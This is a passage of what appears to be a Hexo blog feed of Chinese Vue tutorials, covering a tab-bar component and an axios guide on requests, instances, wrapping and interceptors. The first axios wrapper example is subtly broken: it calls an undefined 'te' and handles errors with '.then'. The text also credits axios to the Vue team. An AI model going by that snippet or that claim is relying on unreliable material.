v-else&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;img-active&quot;&gt;&lt;&#x2F;slot&gt;     </span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div :style&#x3D;&quot;activeStyle&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&#39;item&#39;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;TabBarItem&#39;,</span><br><span class="line">    props:&#123;</span><br><span class="line">      path: String,</span><br><span class="line">      activeColor: &#123;</span><br><span class="line">        type: String,</span><br><span class="line">        default: &#39;red&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      change() &#123;</span><br><span class="line">        this.$router.push(this.path)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">      isActive() &#123;</span><br><span class="line">        return this.$route.path.indexOf(this.path) !&#x3D;&#x3D; -1</span><br><span class="line">      &#125;,</span><br><span class="line">      activeStyle() &#123;</span><br><span class="line">        return this.isActive ? &#123;color: this.activeColor&#125; :&#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .tab-item &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  height: 49px;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.tab-item img &#123;</span><br><span class="line">    width: 24px;</span><br><span class="line">    height: 24px;</span><br><span class="line">    margin-top: 3px;</span><br><span class="line">    &#x2F;* 去除图片底部内容 *&#x2F;</span><br><span class="line">    vertical-align: middle;</span><br><span class="line">    margin-bottom: 2px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>MainTabbar.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;tab-bar&gt;</span><br><span class="line">      &lt;tab-bar-item path&#x3D;&quot;&#x2F;home&quot; &gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">      &lt;tab-bar-item path&#x3D;&quot;&#x2F;category&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;category.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;category_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;div slot&#x3D;&quot;item&quot;&gt;分类&lt;&#x2F;div&gt;        </span><br><span class="line">      &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">      &lt;tab-bar-item path&#x3D;&quot;&#x2F;shopcart&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;shopcart.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;shopcart_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;div slot&#x3D;&quot;item&quot;&gt;购物车&lt;&#x2F;div&gt;         </span><br><span class="line">      &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">      &lt;tab-bar-item path&#x3D;&quot;&#x2F;profile&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;profile.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;profile_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;div slot&#x3D;&quot;item&quot;&gt;我的&lt;&#x2F;div&gt;         </span><br><span class="line">      &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;&#x2F;tab-bar&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import TabBar from &quot;..&#x2F;tabbar&#x2F;TabBar.vue&quot;</span><br><span class="line">  import TabBarItem from &quot;..&#x2F;tabbar&#x2F;TabBarItem.vue&quot;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;MainTabBar&#39;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      TabBar,</span><br><span class="line">      TabBarItem</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;&#x2F;router-view&gt;</span><br><span class="line">    &lt;main-tab-bar&gt;&lt;&#x2F;main-tab-bar&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import MainTabBar from &quot;.&#x2F;components&#x2F;maintabbar&#x2F;MainTabBar.vue&quot;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;App&#39;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      MainTabBar</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  &#x2F;* css样式代码引用 *&#x2F;</span><br><span class="line">  @import &quot;.&#x2F;assets&#x2F;css&#x2F;base.css&quot;;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八、axios学习</title>
      <link href="/2021/03/01/%E5%85%AB%E3%80%81axios%E5%85%A5%E9%97%A8/"/>
      <url>/2021/03/01/%E5%85%AB%E3%80%81axios%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="简介（为什么要用axios）"><a href="#简介（为什么要用axios）" class="headerlink" title="简介（为什么要用axios）"></a>简介（为什么要用axios）</h1><blockquote><p>Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。</p></blockquote><p>这里假设你已经学过Ajax和JQuery，你肯定会有疑问，它和Ajax有什么异同，和jQuery又有什么异同，先来看看ajax的简介——<strong>指一种创建交互式、快速动态网页应用的网页开发技术。</strong></p><p>一般为了避免编写原生ajax出现的bug和简化代码，在以前我们更多的会使用JQuery封装好的ajax，众所周知，jQuery 是一个 JavaScript 库，它可以极大地简化 JavaScript 编程，也包括dom的操作，但是在vue中，也包含了对dom节点的操作，它基本包括了jquery的所有功能，所以，如果只是为了使用ajax而去引入jQuery，是不是有点杀鸡用牛刀，小题大做呢。</p><p>所以vue官方，出了一个和JQuery ajax相同功能的axios，免去为了使用异步网络请求而引入代码量巨大的JQuery</p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><ul><li>从浏览器中创建 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">XMLHttpRequests</a></li><li>从 node.js 创建 <a href="http://nodejs.org/api/http.html" target="_blank" rel="noopener">http</a> 请求</li><li>支持 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">Promise</a> API</li><li>拦截请求和响应</li><li>转换请求数据和响应数据</li><li>取消请求</li><li>自动转换 JSON 数据</li><li>客户端支持防御 <a href="https://www.cnblogs.com/shytong/p/5308667.html" target="_blank" rel="noopener">XSRF</a></li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>npm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure><p>cdn</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="初步使用"><a href="#初步使用" class="headerlink" title="初步使用"></a>初步使用</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.使用axios</span></span><br><span class="line"><span class="comment">//使用方式axios(config)</span></span><br><span class="line"><span class="comment">//无指定，默认get请求</span></span><br><span class="line">axios(&#123;</span><br><span class="line">  url:<span class="string">'http://localhost:3000/primaryschool'</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res.data)</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="并发请求"><a href="#并发请求" class="headerlink" title="并发请求"></a>并发请求</h1><p><code>axios.all([axios(),axios(),...])</code></p><p><code>axios.spread((res1,res2,...) =&gt; {...})</code></p><p>使用promise将它们关联起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.并发请求</span></span><br><span class="line">axios.all([</span><br><span class="line">  <span class="comment">//指定get请求</span></span><br><span class="line">  axios.get(<span class="string">'/primaryschool'</span>), </span><br><span class="line">  axios(&#123;</span><br><span class="line">    <span class="comment">//记得加上http://</span></span><br><span class="line">  url:<span class="string">'/middleschool'</span></span><br><span class="line">&#125;)]).then(</span><br><span class="line">  axios.spread(<span class="function">(<span class="params">res1,res2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res1.data)</span><br><span class="line">  <span class="built_in">console</span>.log(res2.data)</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h1 id="简单默认配置"><a href="#简单默认配置" class="headerlink" title="简单默认配置"></a>简单默认配置</h1><p>格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.axios默认配置</span></span><br><span class="line">axios.defaults.baseURL = <span class="string">'http://localhost:3000'</span></span><br></pre></td></tr></table></figure><h2 id="常见配置"><a href="#常见配置" class="headerlink" title="常见配置"></a>常见配置</h2><ul><li>请求地址：<code>url: &#39;/user&#39;</code>,</li><li>请求类型：<code>method: &#39;get</code>‘,</li><li>请求根路径：<code>baseURL: &#39;http://www.mt.com/api&#39;</code>,</li><li>请求前的数据处理：<code>transformRequest:[function(data){}]</code>,</li><li>请求后的数据处理：<code>transformResponse: [function(data){}]</code>,</li><li>自定义的请求头：<code>headers:{&#39;x-Requested-With&#39;:&#39;XMLHttpRequest&#39;}</code>,</li><li>URL查询对象：<code>params:{ id: 12 }</code>,</li><li>request body：<code>data: { key: &#39;aa&#39;}</code>,</li><li>查询对象序列化函数：<code>paramsSerializer: function(params){ }</code></li><li>超时设置s：<code>timeout: 1000</code>,</li><li>跨域是否带Token：<code>withCredentials: false</code>,</li><li>自定义请求处理：<code>adapter: function(resolve, reject, config){}</code>,</li><li>身份验证信息：<code>auth: { uname: &#39;&#39;, pwd: &#39;12&#39;</code>},</li><li>响应的数据格式 json / blob /document /arraybuffer / text / stream：<code>responseType: &#39;json&#39;</code>,</li></ul><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><blockquote><p>当我们从axios模块中导入对象时, 使用的实例是默认的实例.</p><p>当给该实例设置一些默认配置时, 这些配置就被固定下来了.</p><p>但是后续开发中, 某些配置可能会不太一样.</p><p>比如某些请求需要使用特定的baseURL或者timeout或者content-Type等.</p><p>这个时候, 我们就可以创建新的实例, 并且传入属于该实例的配置信息.</p></blockquote><p><strong>创建实例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">const</span> a = axios.create(&#123;</span><br><span class="line">  baseURL: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">  method: <span class="string">'get'</span>,</span><br><span class="line">  timeout: <span class="number">5000</span> <span class="comment">//设定请求超时时间</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 发送网络请求</span></span><br><span class="line">a(&#123;</span><br><span class="line">  url: <span class="string">'/middleschool'</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="封装axios"><a href="#封装axios" class="headerlink" title="封装axios"></a>封装axios</h1><p>为什么要封装axios，假设这样一种情况，你的vue项目一直在用jQuery的ajax，不可避免的，你的很多个需要发起网络请求的组件都要使用到JQuery，但是突然又一天，上面要求整个项目弃用掉jQuery，改用axios，苦逼的事情就来了，你要把每个组件与jQuery相关的代码删除，然后替换成axios的网络请求模块，要是这是一个小项目还好，你需要改的组件只有几个，但如果这是一个大项目呢，上百个组件都要改，你就要一个一个去修改，打工人的加班就来了。而如果你将网络请求的代码的封装成一个文件，那么你就可以在下次需要更换插件时，只需修改封装的代码就行了。</p><p>总而言之，封装<strong>第三方插件</strong>是为了减少组件对其依赖，从而使组件的独立性以及可复用性可以更高</p><p>在src文件夹下新建network文件夹用来存放网络请求响应的相关文件，新建一个request.js作为请求文件</p><h2 id="axios”封装史”"><a href="#axios”封装史”" class="headerlink" title="axios”封装史”"></a>axios”封装史”</h2><p>首先，引入axios模块（通用）以及创建封装函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种封装方式，通过回调传参数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>通过回调传递参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种封装方式，通过回调传参数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config,success,failure</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> a = axios.create(&#123;</span><br><span class="line">    baseURL: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    timeout: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line">  te(config)</span><br><span class="line">  .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    success(res.data)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    failure(err)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request(<span class="string">'http://localhost:3000/middleschool'</span>,</span><br><span class="line">     res =&gt; &#123;<span class="built_in">console</span>.log(res)&#125;,</span><br><span class="line">     err =&gt; &#123;<span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err)&#125;</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></li><li><p>通过return一个Promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二种方法，通过Promise</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> te = axios.create(&#123;</span><br><span class="line">    baseURL: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    timeout: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    te(config)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(res.data)</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      reject(err)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>然后这样做的好处就是你就可以在使用的时候then下去了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request(<span class="string">'http://localhost:3000/middleschool'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>最终版，其实，本来，axios本身就是支持Promis，所以我们何不直接把它return出去呢，这样代码会更加简单明了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> te = axios.create(&#123;</span><br><span class="line">    baseURL: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    timeout: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> te(config)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>使用，同第二种是一样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request(<span class="string">'http://localhost:3000/middleschool'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><blockquote><p>axios提供了拦截器，用于我们在发送每次请求或者得到相应后，进行对应的处理</p></blockquote><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>请求拦截</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">te.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(config)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'这里是请求拦截器'</span>)</span><br><span class="line">  <span class="keyword">return</span> config <span class="comment">//记得返回</span></span><br><span class="line">&#125;,err =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>响应拦截</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">te.interceptors.response.use(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'这里是响应拦截器'</span>)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;, err =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>完整代码</strong>，注意：这是在封装中使用拦截器，还有，使用完，记得返回config/res，否则下一步无法继续</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拦截器</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> te = axios.create(&#123;</span><br><span class="line">    baseURL: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    timeout: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  te.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(config)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这里是请求拦截器'</span>)</span><br><span class="line">    <span class="keyword">return</span> config <span class="comment">//记得返回</span></span><br><span class="line">  &#125;,err =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  te.interceptors.response.use(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这里是响应拦截器'</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;, err =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> te(config)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%85%AB%E3%80%81axios%E5%85%A5%E9%97%A8/image-20201031162642133.png" alt="image-20201031162642133"></p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><h3 id="请求拦截器"><a href="#请求拦截器" class="headerlink" title="请求拦截器"></a>请求拦截器</h3><ol><li>发送网络请求时，在页面显示loading请求图标</li><li>在需要用户输入信息时（比如登录），判断用户是否有token，如没有，则会跳转到登录界面</li><li>对请求的参数进行序列化和修改</li><li>请求拦截中错误拦截较少，通常都是配置相关的拦截，可能的错误比如请求超时，可以将页面跳转到一个误页面中</li></ol><h3 id="响应拦截器"><a href="#响应拦截器" class="headerlink" title="响应拦截器"></a>响应拦截器</h3><ol><li>响应成功：主要是对数据进行过滤</li><li>响应失败：根据status判断报错的错误码，跳转到不同的错误提示页面</li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>七、Vuex入门</title>
      <link href="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/"/>
      <url>/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/</url>
      
